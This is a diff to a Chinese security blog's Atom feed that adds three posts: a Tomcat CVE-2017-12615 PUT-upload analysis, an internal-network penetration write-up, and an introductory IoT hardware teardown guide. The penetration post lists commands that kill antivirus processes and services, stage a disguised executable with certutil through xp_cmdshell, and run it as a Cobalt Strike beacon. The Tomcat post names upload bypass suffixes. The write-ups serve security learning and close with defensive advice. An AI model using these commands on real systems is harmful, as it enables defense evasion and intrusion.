@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://www.future-sec.com/"/>
-  <updated>2017-08-30T09:01:14.453Z</updated>
+  <updated>2017-11-20T07:52:22.019Z</updated>
   <id>http://www.future-sec.com/</id>
   
   <author>
@@ -14,6 +14,122 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Tomcat 远程代码执行漏洞分析（CVE-2017-12615）</title>
+    <link href="http://www.future-sec.com/tomcat-code-execution.html"/>
+    <id>http://www.future-sec.com/tomcat-code-execution.html</id>
+    <published>2017-11-19T16:00:00.000Z</published>
+    <updated>2017-11-20T07:52:22.019Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>环境是Windows 7 64位  Apache Tomcat 7.0.70<br><img src="/images/tom/1.jpg" alt="img"></p>
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>根据描述，在 Windows 服务器下，将 readonly 参数设置为 false 时，即可通过 PUT 方式创建一个 JSP 文件，并可以执行任意代码。<br>通过阅读 conf/web.xml 文件，可以发现：<br><img src="/images/tom/2.jpg" alt="img"><br>修改 Tomcat 7.0/conf/web.xml 文件。添加 readonly 属性，设置为false。<br><img src="/images/tom/3.jpg" alt="img"><br>重启tomcat<br>启动 Tomcat，利用 PUT 请求创建文件：<br><img src="/images/tom/4.jpg" alt="img"><br>提示 404。通过所描述的 Windows 受影响，可以结合 Windows 的特性。一是 NTFS 文件流，二是文件名的相关限制（比如 Windows 中文件名不能以空格结尾）来绕过限制：<br><img src="/images/tom/5.jpg" alt="img"><br><img src="/images/tom/6.jpg" alt="img"><br>访问发现可以正常输出：<br><img src="/images/tom/7.jpg" alt="img"></p>
+<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>本次的tomcat漏洞涉及到DefaultServlet和 JspServlet。<br>Tomcat的Servlet 是在 conf/web.xml 配置的，通过配置文件可知，当后缀名为 .jsp 和 .jspx 的时候，是通过JspServlet处理请求的，下面的默认的配置情况：<br><img src="/images/tom/8.jpg" alt="img"><br>而其他的静态文件时通过DefaultServlet处理的，同时DefaultServlet 可以处理 PUT 或 DELETE请求：<br><img src="/images/tom/9.jpg" alt="img"><br>也就是说，除了jsp和jspx默认是由org.apache.jasper.servlet.JspServlet处理，其他默认都是由org.apache.catalina.servlets.DefaultServlet来处理。<br>从而的得知，即是设置readonly为false，tomcat在默认情况下也不允许PUT上传jsp和jspx文件，因为后端都用org.apache.jasper.servlet.JspServlet来处理jsp或是jspx后缀的请求了，而JspServlet中没有PUT上传的相关操作，PUT的代码实现只存在于DefaultServlet中。<br>这个漏洞的根本是通过构造特殊后缀名，绕过了tomcat检测，让它用DefaultServlet的逻辑去处理请求，从而上传jsp文件。<br>目前主要三种方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">test.jsp%<span class="number">20</span></div><div class="line">test.jsp::$DATA</div><div class="line">test.jsp/   (bypass)</div></pre></td></tr></table></figure></p>
+<p>可以得知，“test.jsp ”（末尾有一个和空格即“test.jsp%20”）和“test.jsp::$DATA<br>”并不能匹配到 JspServlet，而是会交由DefaultServlet去处理。当处理 PUT 请求时：<br><img src="/images/tom/10.jpg" alt="img"><br>主要是doPut，这里tomcat开始处理PUT请求，可以看到这里如果readonly是true就直接进入error了，所以在前面的步骤中需要设置成false。<br><img src="/images/tom/11.jpg" alt="img"><br>会调用resources.bind：<br><img src="/images/tom/12.jpg" alt="img"><br><img src="/images/tom/13.jpg" alt="img"><br>而继续调用dirContext.bind<br><img src="/images/tom/14.jpg" alt="img"><br>真正写入文件在FileDirContext.java的rebind函数里<br><img src="/images/tom/15.jpg" alt="img"><br>又由于 Windows 不允许“ ”（此处为一个空格）作为文件名结尾，所以会创建一个 .jsp 文件，导致代码执行。<br>FileOutputStream特性<br>到这里是否会想，当请求jsp%20或是jsp::$DATA后缀的时候，为什么最终却写入.jsp后缀的文件?<br>这些其实是java.io. FileOutputStream的问题了，需要进一步分析jdk的C代码才能得到解答，如图<br><img src="/images/tom/16.jpg" alt="img"><br>跟进去FileOutputStream<br><img src="/images/tom/17.jpg" alt="img"><br>跟进去open<br><img src="/images/tom/18.jpg" alt="img"><br>跟到open是native的，不是java层面的问题了，这里open实际上是一个jni接口，然后调用windows API CreateFileW创建文件，这里下载openjdk6的jdk代码进行分析，如图:<br><img src="/images/tom/19.jpg" alt="img"><br>FileOutputStream_md.c<br>这里Java_java_io_FileOutputStream_open便是上面java代码里open函数的C代码实现，其中参数path对应open函数的name变量，继续跟踪，如图:<br><img src="/images/tom/20.jpg" alt="img"><br>io_util_md.c<br>继续跟进去winFileHandleOpen，这里最终调用windows的CreateFileW实现文件创建，如图：<br><img src="/images/tom/21.jpg" alt="img"><br>io_util_md.c<br>而在windows下，创建文件是对后缀名称进行处理的，例如：如果后缀末尾是空格，会被去掉，a.txt::$DATA传入CreateFileW也会被处理成a.txt</p>
+<h2 id="Bypass-分析"><a href="#Bypass-分析" class="headerlink" title="Bypass 分析"></a>Bypass 分析</h2><p>然而，当 PUT 地址为/test.jsp/时，仍然会创建 JSP，会影响 Linux 和 Windows 服务器，并且 Bypass 了之前的补丁，分析如下。<br>在进入 bind 函数时，会声明一个 File 变量：<br><img src="/images/tom/22.jpg" alt="img"><br>进入 File 后，会对 name 进行 normalize  (在file.class)<br><img src="/images/tom/23.jpg" alt="img"><br>继续跟入<br><img src="/images/tom/24.jpg" alt="img"><br>在这里这个normalize(path, n, (prev == slash) ? i - 1 : i)会将文件名末尾的/过滤掉，所以可以导致后面文件写入jsp文件。</p>
+<h2 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h2><p>由于存在去掉最后的 / 的特性，那么这个漏洞自然影响 Linux 以及 Windows 版本。而且经过测试，这个漏洞影响全部的 Tomcat 版本，从 5.x 到 9.x 都会受到影响。目前来说，最好的解决方式是将 conf/web.xml 中对于 DefaultServlet 的 readonly 设置为 true，（默认设置是false）。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;复现环境&quot;&gt;&lt;a href=&quot;#复现环境&quot; class=&quot;headerlink&quot; title=&quot;复现环境&quot;&gt;&lt;/a&gt;复现环境&lt;/h2&gt;&lt;p&gt;环境是Windows 7 64位  Apache Tomcat 7.0.70&lt;br&gt;&lt;img src=&quot;/images/to
+    
+    </summary>
+    
+      <category term="系统安全" scheme="http://www.future-sec.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="Tomcat" scheme="http://www.future-sec.com/tags/Tomcat/"/>
+    
+      <category term="远程代码执行" scheme="http://www.future-sec.com/tags/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>记一次曲折的内网渗透</title>
+    <link href="http://www.future-sec.com/network-penetration.html"/>
+    <id>http://www.future-sec.com/network-penetration.html</id>
+    <published>2017-11-19T16:00:00.000Z</published>
+    <updated>2017-11-20T08:29:04.175Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p> 网络：内网C1和C2处于同一网段，可以互通，仅DNS可以访问外网。 安全防护：360全家桶、安全狗、云锁定制版、金山卫士 其他相关信息如下表：<br><img src="/images/20171120162810.jpg" alt="img"></p>
+<h2 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h2><p>C1是通weblogic反序列化拿下的，具体怎么获取的webshell就不细说了，根据C1的配置、文件、主机名和数据库等信息可以知道，目标网站之前是存放再C1的，因为上面的源码和数据库基本上和C2的一致。通过weblogic的配置文件可以知道C2的真实IP，主机上面存在各种安全防护软件，各种全家桶，很多命令、脚本和exe都无法运行，比如带有net的命令都无法运行，net、netstat、sc、wscript等</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>目标：获取C2的管理权限，包括网站内容管理和替换等，非单纯的系统权限。<br>1、通过C1利用http隧道或DNS隧道进行socks代理，对C2进行进一步渗透<br>2、抓取C1管理员口令或直接利用当前用户的token进行攻击<br>3、利用数据库或中间件弱口令进行攻击<br>4、利用web漏洞进行攻击，如注入、上传和命令执行等漏洞<br>5、中间人攻击或者嗅探等，但是影响太大，也需等比较久的时间</p>
+<h2 id="过河搭桥"><a href="#过河搭桥" class="headerlink" title="过河搭桥"></a>过河搭桥</h2><p>由于是weblogic，无法直接使用http隧道类的代理，因为环境仅支持jspx，没有找到可以用的代理webshell，故采取第二种方案，即通过DNS进行控制和代理。这里我首先想到的自然是cobalt strike的DNS Beacon。</p>
+<h2 id="cobalt-strike-dns-beacon-环境构建"><a href="#cobalt-strike-dns-beacon-环境构建" class="headerlink" title="cobalt strike dns beacon 环境构建"></a>cobalt strike dns beacon 环境构建</h2><p>参考：<a href="https://www.cobaltstrike.com/help-dns-beacon" rel="external nofollow noopener noreferrer" target="_blank">官方手册</a> 或自行google</p>
+<h2 id="获取beacon"><a href="#获取beacon" class="headerlink" title="获取beacon"></a>获取beacon</h2><p>由于存在360全家桶等，所以得先把他们干掉：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">taskkill /im <span class="number">360</span>* /t /f</div><div class="line">taskkill /im ZhuDongFangYu.exe /t /f</div><div class="line">taskkill /im KSafeSvc.exe /t /f</div><div class="line">ps:云锁是定制版，这里就不写进程名称了，也不影响远控的执行，安全无法结束也不影响</div></pre></td></tr></table></figure></p>
+<p>由于无法上传exe，所以将生成exe重命名为jspx上传，执行之后，等待几分钟，既可以成功上线，这里有个坑，因为内网配置的DNS可能是一些不知名的或者是114之类的，会影响上线，所以这里建议使用8.8.8.8或者119.29.29.29，因为我用的是DNSPOD，修改DNS:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netsh interface ip set dns "本地连接" source=static addr=119.29.29.29</div></pre></td></tr></table></figure></p>
+<h2 id="开启代理"><a href="#开启代理" class="headerlink" title="开启代理"></a>开启代理</h2><p> 参考<a href="https://cobaltstrike.com/help-socks-proxy-pivoting" rel="external nofollow noopener noreferrer" target="_blank">官方手册</a><br> linux可以用Proxychains，windows可以使用Proxifier PE或SocksCap64 </p>
+<h2 id="内网漫游"><a href="#内网漫游" class="headerlink" title="内网漫游"></a>内网漫游</h2><p> 通过jsp大马自带的端口扫描发现C2开放的端口有： 80：WMC生成的html，没啥可搞的 1433：因为C1的mysql账号密码是root/root，因此猜测存在弱口令 8080、8001、8081：就apache的一个代理，没有什么页面和功能 利用socks代理通过1433连接器，sa/sa获取了mssql的DBA权限，暗自高兴了一会，以为道这里就快搞定了，因为系统存在多个web服务，很自然的可以想到，直接可以通过mssql的xp_cmdshell，echo一个一句话就可以搞定了，然而这只是开始。 </p>
+<h2 id="山重水复疑无路"><a href="#山重水复疑无路" class="headerlink" title="山重水复疑无路"></a>山重水复疑无路</h2><p>iis环境，可以写一句话，但是所有目录的脚本权限都被禁止，所以这条路也断了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">简单提一下，iis找网站路径的方法</div><div class="line"><span class="number">1.</span> dir/s /b f:\<span class="number">123.</span>jpg (磁盘文件太多时无法使用)</div><div class="line"><span class="number">2.</span> 查看配置文件：</div><div class="line">iis6:type  %systemroot%\system32\inetsrv\metabase.xml|findstr Path=</div><div class="line">iis7/<span class="number">8</span>:type %systemroot%\System32\inetsrv\config\applicationHost.config|findstr physicalPath=</div><div class="line">iis7/<span class="number">8</span>:  appcmd <span class="keyword">list</span> sites</div></pre></td></tr></table></figure></p>
+<p>apache环境并没有装php，无法执行php脚本<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wmic process where name=<span class="string">"httpd.exe"</span> get processid,executablepath,name</div><div class="line">其他中间件或web服务的也可以根据运行程序的路径，查看其配置文件，使用wmic命令查看运行路径:</div></pre></td></tr></table></figure></p>
+<p>上远控，远控怎么上传上去呢？于是找到这篇文章<a href="http://www.91ri.org/17255.html" rel="external nofollow noopener noreferrer" target="_blank">《15种文件下载的方式》</a><br>    再win2k3上面能用的，就剩下ftp、vbs、Bitsadmin、smb、c#、hex<br>        vbs和smb都被安全狗限制无法利用<br>        c#编译成功了，但是无法下载，貌似也被限制了<br>        bitsadmin不存在此命令<br>        FTP批量处理下载，C1上面有一个FTP，也是无法成功下载<br>        hex太长转换麻烦，暂时不考虑<br>    刚刚最近国外有大神提到了certutil命令，本地测试了一下，下载的文件无法指定路径，也不能正常保存，故又放弃了此路，详情可以参考这篇<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84certutil.exe/" rel="external nofollow noopener noreferrer" target="_blank">文章</a>，win2k3保存有问题</p>
+<h2 id="柳暗花明又一村"><a href="#柳暗花明又一村" class="headerlink" title="柳暗花明又一村"></a>柳暗花明又一村</h2><p> 经过尝试各种下载姿势，还是无法下载，想了很久，又回到了certutil，因为他是系统自带的命令，从win2k3道windows 2016都是存在的，既可以用于下载，也可以用于base64编码和文件hash校验。故此：<br>通过certutil将生成的exe转换为base64编码，利用echo命令写入到文本<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="number">1.</span> 文件hash</div><div class="line">(<span class="number">1</span>) SHA1</div><div class="line">certutil.exe -hashfile msg.dll</div><div class="line">(<span class="number">2</span>) SHA256：</div><div class="line">certutil.exe -hashfile msg.dll SHA256</div><div class="line">(<span class="number">3</span>) MD5：</div><div class="line">certutil.exe -hashfile msg.dll MD5</div><div class="line"><span class="number">2.</span>编码</div><div class="line">(<span class="number">1</span>) base64编码：</div><div class="line">CertUtil -encode InFile OutFile</div><div class="line">(<span class="number">2</span>) base64解码</div><div class="line">CertUtil -decode InFile OutFile</div><div class="line">注：编码后的文件会添加两处标识信息，不影响文件解码</div><div class="line">文件头：</div><div class="line">-----BEGIN CERTIFICATE-----</div><div class="line">文件尾：</div><div class="line">-----END CERTIFICATE-----</div></pre></td></tr></table></figure></p>
+<p>mssql查询分析器批量echo文本保存<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">exec master..xp_cmdshell <span class="string">"echo xxxx &gt;&gt; C:\temp\test.txt"</span></div></pre></td></tr></table></figure></p>
+<p> 使用certutil还原exe可以还原为txt，因为exe无法写入，并使用其校验文件hash<br>结束相关杀软进程和服务，这里提一点，因为C2的360是自动启动的，所以需要禁用自启，由于sc无法使用，我们可以使用wmic替代：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">exec master..xp_cmdshell <span class="string">"taskkill /im 360* /t /f"</span></div><div class="line">taskkill /im ZhuDongFangYu.exe /t /f</div><div class="line">exec master..xp_cmdshell <span class="string">"wmic Service where name='360EntClientSvc' call stopservice"</span></div><div class="line">exec master..xp_cmdshell <span class="string">"wmic Service where name='360rp' call stopservice"</span></div></pre></td></tr></table></figure></p>
+<p>最后运行解码的exe即可<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">CertUtil -decode test.txt xshell.txt</div><div class="line">wmic process call create <span class="string">'c:\temp\xshell.txt'</span></div></pre></td></tr></table></figure></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p> 本次渗透，可以说是一波三折，主要学习到的东西是在复杂环境下，综合利用各种windows自带的工具进行绕过安全防护，如wmic、taskkill、certutil等综合运用，才得以绕过杀软的防御，也存在一定运气的成分如数据库弱口令、病毒库更新不及时等。 从防御的角度来看的话：<br>1、加强日常安全运维的巡检，其实我的exe上传不止一次被杀或这被拦截，如果巡检自然可以发现<br>2、提高安全运维人员意识，做好安全策略管理，如数据库弱口令这些本不该有的<br>3、及时更新防病毒软件和恶意代码库，新版的360没法结束<br>4、加强对外恶意流量的安全检测，如DNS、http等</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h2&gt;&lt;p&gt; 网络：内网C1和C2处于同一网段，可以互通，仅DNS可以访问外网。 安全防护：360全家桶、安全狗、云锁定制版、金山卫士 其他相关信息如下
+    
+    </summary>
+    
+      <category term="web安全" scheme="http://www.future-sec.com/categories/web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="内网渗透" scheme="http://www.future-sec.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>物联网硬件安全分析基础-硬件分析初探</title>
+    <link href="http://www.future-sec.com/iot-security-hardware-analysis.html"/>
+    <id>http://www.future-sec.com/iot-security-hardware-analysis.html</id>
+    <published>2017-11-16T16:00:00.000Z</published>
+    <updated>2017-11-20T07:08:43.333Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当我们在分析IOT设备，如智能摄像头、智能门锁、智能路由器等等产品时，采用传统的安全检测手段，如对APP的逆向、云端服务器的渗透测试、产品通信的抓包等方式可以获得部分的信息，但如果需要深入分析智能设备底层的工作原理，从中发现更深层次的安全问题，就不可避免的需要直接接触硬件本身，这也是传统安全手段未能触及的部分，据此，下面简单的谈下关于电路分析和芯片固件提取和调试的一点心得。</p>
+<h2 id="电路识别"><a href="#电路识别" class="headerlink" title="电路识别"></a>电路识别</h2><p>在对电路进行分析之前，需要对PCB电路图和电子元器件知识有简单的了解。<br>PCB（ Printed Circuit Board），中文名称为印制电路板，又称印刷线路板，是重要的电子部件，是电子元器件的支撑体，是电子元器件电气连接的载体。由于它是采用电子印刷术制作的，故被称为“印刷”电路板。<br><img src="/images/image11.jpg" alt="img"><br><img src="/images/image12.jpg" alt="img"><br><img src="/images/image13.jpg" alt="img"></p>
+<h2 id="电子元器件"><a href="#电子元器件" class="headerlink" title="电子元器件"></a>电子元器件</h2><p>电子元件有着不同的封装类型，不同类的元件外形一样，但内部结构及用途是大不一样的，比如TO220封装的元件可能是三极管、可控硅、场效应管、或双二极管。TO-3封装的元件有三极管，集成电路等。二极管也有几种封装，玻璃封装、塑料封装及螺栓封装，二极管品种有稳压二极管、整流二极管、隧道二极管、快恢复二极管、微波二极管、肖特基二极管等，这些二极管都用一种或几种封装。贴片元件由于元件微小有的干脆不印字常用尺寸大多也就几种，所以没有经验的人很难区分，但贴片二极管及有极性贴片电容与其它贴片则很容易区分，有极性贴片元件有一个共同的特点，就是极性标志。对于元件识别可以看印字型号来区别，对于元件上没有字符的器件也可分析电路原理或用万用表测量元件参数进行判断。判断元件类型并非一朝一夕就能学会的，这需要多年积累的经验来认识。<br><img src="/images/image14.jpg" alt="img"><br><img src="/images/image15.jpg" alt="img"><br><img src="/images/image16.jpg" alt="img"></p>
+<h2 id="ROM芯片"><a href="#ROM芯片" class="headerlink" title="ROM芯片"></a>ROM芯片</h2><p>在对PCB和电子元器件有一定认知后，就可以开始分析其工作原理和芯片了，常见的IOT产品，一般采用嵌入式linux系统开发，对芯片分析主要目的之一就是获取到硬件系统的固件，从固件中分析可能存在的安全风险。<br>固件一般存储在ROM中，ROM是只读存储器（Read-Only Memory）的简称，是一种只能读出事先所存数据的固态半导体存储器。其特性是一旦储存资料就无法再将之改变或删除。通常用在不需经常变更资料的电子或电脑系统中，并且资料不会因为电源关闭而消失。<br>常见的存储芯片按照存储读取方式和制作工艺不同，可以分为： ROM、PROM、EPROM、EEPROM、FLASH-ROM。<br>在大部分IOT产品中多采用flash芯片作为存储器，提取固件主要也是通过读取flash芯片。<br><img src="/images/image17.jpg" alt="img"><br><img src="/images/image18.jpg" alt="img"><br><img src="/images/image19.jpg" alt="img"></p>
+<h2 id="Flash芯片"><a href="#Flash芯片" class="headerlink" title="Flash芯片"></a>Flash芯片</h2><p>FLASH ROM属于真正的单电压芯片，在使用上很类似EEPROM，因此，有些书籍上便把FLASH ROM作为EEPROM的一种。事实上，二者还是有差别的。FLASH ROM在擦除时，也要执行专用的刷新程序，但是在删除资料时，并非以Byte为基本单位，而是以Sector（又称Block）为最小单位，Sector 的大小随厂商的不同而有所不同；只有在写入时，才以Byte为最小单位写入；FLASH ROM芯片的读和写操作都是在单电压下进行，不需跳线，只利用专用程序即可方便地修改其内容；FLASH ROM的存储容量普遍大于EEPROM，约为512K到至8M KBit，由于大批量生产，价格也比较合适，很适合用来存放程序码，近年来已逐渐取代了EEPROM，广泛用于主板的BIOS ROM，也是CIH攻击的主要目标。<br><img src="/images/image20.jpg" alt="img"><br><img src="/images/image21.jpg" alt="img"><br><img src="/images/image22.jpg" alt="img"><br>     根据技术方式不同可分为： IIC EEPROM、SPI NorFlash 、CFI Flash、Parallel NandFlash、SPI NandFlash、eMMC Flash、USF2.0等。<br>      其中SPI NorFlash因为接口简单，使用的引脚少，易于连接，操作方便，并且可以在芯片上直接运行代码，其稳定性出色，传输速率高，在小容量时具有很高的性价比，这使其很适合应于嵌入式系统中作为 FLASH ROM，所以在市场的占用率非常高。<br>      我们通常见到的S25FL128、MX25L1605、W25Q64等型号都是SPI NorFlash，其常见的封装多为SOP8，SOP16，WSON8，US0N8，QFN8、BGA24等。<br><img src="/images/image23.jpg" alt="img"><br><img src="/images/image24.jpg" alt="img"></p>
+<h2 id="芯片印字"><a href="#芯片印字" class="headerlink" title="芯片印字"></a>芯片印字</h2><p>一般PCB上有多块逻辑处理IC，在多个IC芯片中，可以通过分析电路原理和查找芯片印字来确定具体的存储芯片。<br> 芯片上的丝印大多数情况会注明厂商和芯片型号，通过印字可以初步确定芯片类型，同时丝印层的文字也可以帮助我们来确定存储的格式和大小，常见的W25芯片的印字含义如下：<br>       <img src="/images/image25.jpg" alt="img"></p>
+<h2 id="编程器"><a href="#编程器" class="headerlink" title="编程器"></a>编程器</h2><p>读取Flash芯片，需要借助编程器，编程器又称烧录器、写入器、写码器，是专门用来对IC芯片进行读写、编程/烧录的仪器。<br>并口多功能BIOS编程器，它可以对EPROM（27系列芯片）、EEPROM（28系列芯片）、FLASH ROM（29、39、49系列芯片）及单片机、串行芯片等进行读写、编程，是一种性价比较高的编程器。<br>编程器种类多样，从功能简单的专用型到功能全面的全功能通用型都有，价格从几十元到上万元不等。<br><img src="/images/image26.jpg" alt="img"><br><img src="/images/image27.jpg" alt="img"><br><img src="/images/image28.jpg" alt="img"></p>
+<h2 id="串口通信"><a href="#串口通信" class="headerlink" title="串口通信"></a>串口通信</h2><p>串口通信指串口按位（bit）发送和接收字节。尽管比按字节（byte）的并行通信慢，但是串口可以在使用一根线发送数据的同时用另一根线接收数据。在串口通信中，常用的协议包括RS-232、RS-422和RS-485。<br>        RS-232通信方式允许简单连接三线：Tx、Rx和地线。但是对于数据传输，双方必须对数据定时采用使用相同的波特率。<br>        RS-422标准全称是“平衡电压数字接口电路的电气特性”，在RS232后推出，使用TTL差动电平表示逻辑，就是两根的电压差表示逻辑，RS422定义为全双工的，所以最少要4根通信线（一般额外地多一根地线）。<br>        RS485是一个定义平衡数字多点系统中的驱动器和接收器的电气特性的标准，RS-485与RS-422的区别在于RS-485为半双工通信方式，RS-422为全双工方式。RS-422用两对平衡差分信号线分别用于发送和接收，所以采用RS-422接口通信时最少需要4根线。RS-485只用一对平衡差分信号线，不能同时发送和接收，最少只需两根连线。<br><img src="/images/image29.jpg" alt="img"><br><img src="/images/image30.jpg" alt="img"><br><img src="/images/image31.jpg" alt="img"></p>
+<h2 id="UART调试"><a href="#UART调试" class="headerlink" title="UART调试"></a>UART调试</h2><p>通用异步收发传输器（Universal Asynchronous Receiver/Transmitter)，通常称作UART，是一种异步收发传输器，是电脑硬件的一部分。它将要传输的资料在串行通信与并行通信之间加以转换。作为把并行输入信号转成串行输出信号的芯片，UART通常被集成于其他通讯接口的连结上。<br>对于物联网硬件的串口调试，多数情况下指的就是通过UART串口进行数据通讯， 但是我们经常搞不清楚它和COM口的区别,  以及RS232, TTL等关系,             实际上UART、COM指的物理接口形式(硬件), 而TTL、RS-232是指的电平标准(电信号).<br>UART有4个pin（VCC, GND, RX, TX）, 用的TTL电平， 低电平为0(0V)、高电平为1（3.3V或以上），Uart串口的RXD、TXD等一般直接与处理器芯片的引脚相连，而RS232串口的RXD、TXD等一般需要经过电平转换(通常由Max232等芯片进行电平转换)才能接到处理器芯片的引脚上，否则这么高的电压很可能会把芯片烧坏。<br>在调试的时候, 多数情况下我们只引出rx、tx、gnd即可，但是UART的数据要传到电脑上分析就要匹配电脑的接口，通常我们电脑使用接口有COM口和USB口（最终在电脑上是一个虚拟的COM口），但是要想连上这两种接口都要需要进行硬件接口转换和电平转换。<br><img src="/images/image32.jpg" alt="img"><br><img src="/images/image33.jpg" alt="img"></p>
+<h2 id="设备拆解"><a href="#设备拆解" class="headerlink" title="设备拆解"></a>设备拆解</h2><p>对于一台未接触过的机器，拆解首先需要观察其外部结构，是否存在暴露的螺丝孔，如果没有，一般可能隐藏在贴纸或橡胶垫下面，可以用手感受是否存在空洞，部分机器采用卡榫结构，只要找对方向，用一字螺丝刀或撬片，从缝隙中就可以撬开，拆解设备唯一的要诀就是胆大心细。部分常用工具如下：<br><img src="/images/image103.jpg" alt="img"><br><img src="/images/image104.jpg" alt="img"><br>维修组合套装，用来拆装各类螺丝，PCB夹用来拔出排线，手电筒用来观察芯片印字和PCB走线，PCB测试夹用来夹住某些难以焊接的焊点，排线用来连接各类电子设备，热风枪和焊枪用来拆焊和锡焊。</p>
+<h2 id="常见物联网智能设备"><a href="#常见物联网智能设备" class="headerlink" title="常见物联网智能设备"></a>常见物联网智能设备</h2><p><img src="/images/image105.jpg" alt="img"><br>共享充电宝，采用gprs模块配合物联卡与云端通信</p>
+<p><img src="/images/image106.jpg" alt="img"><br>蓝牙挂锁，通过蓝牙芯片与手机配对通信，<br>蓝牙控制电机驱动，使卡锁运转</p>
+<p><img src="/images/image107.jpg" alt="img"><br>共享充电宝，采用GSM模块加蓝牙模块控制通信</p>
+<p><img src="/images/image108.jpg" alt="img"><br>智能锁，WIFI芯片加蓝牙芯片配合控制<br>，外接指纹识别传感器</p>
+<p><img src="/images/image109.jpg" alt="img"><br>智能摄像头，采用WIFI芯片通信，外接音频、视频处理模块</p>
+<p><img src="/images/image110.jpg" alt="img"><br>网络摄像机，采用网卡芯片，配合多口输出输入视频信号模块</p>
+<p><img src="/images/image111.jpg" alt="img"><br>智能路由器，高容量内存搭配智能OS</p>
+<p><img src="/images/image112.jpg" alt="img"><br>智能家居控制终端，高性能WIFI收发中继控制</p>
+<p><img src="/images/image113.jpg" alt="img"><br>智能保险柜，采用WIFI芯片控制加指纹识别传感器</p>
+<p><img src="/images/image114.jpg" alt="img"><br>无线终端，采用4G模块和WIFI芯片，做便携式WIFI终端</p>
+<h2 id="读取芯片"><a href="#读取芯片" class="headerlink" title="读取芯片"></a>读取芯片</h2><p>为了读取Flash芯片的内容，有以下三个基本途径：<br>（1）直接将导线连接到芯片的引脚，在通过导线连接编程器读取固件；<br>（2）把芯片拆下来，在连接编程器读取固件。<br>（3）连接TXD、RXD调试PIN，通过UART串口转接读取固件。<br>根据Flash芯片的封装方式和电路设计不同，需要灵活采用不同的方式。</p>
+<p><img src="/images/image34.jpg" alt="img"><br><img src="/images/image35.jpg" alt="img"></p>
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p> <a href="http://www.china-cic.cn/" rel="external nofollow noopener noreferrer" target="_blank">http://www.china-cic.cn/</a>  中国通信协会相关文献<br>  <a href="https://www.eia.gov/" rel="external nofollow noopener noreferrer" target="_blank">https://www.eia.gov/</a>  美国电子工业协会相关标准</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;当我们在分析IOT设备，如智能摄像头、智能门锁、智能路由器等等产品时，采用传统的安全检测手段，如对APP的逆向、云端服务器的渗透测试、产品通
+    
+    </summary>
+    
+      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="硬件安全" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="硬件分析" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%88%86%E6%9E%90/"/>
+    
+  </entry>
   
   <entry>
     <title>BROADCOM WI-FI芯片漏洞分析一</title>
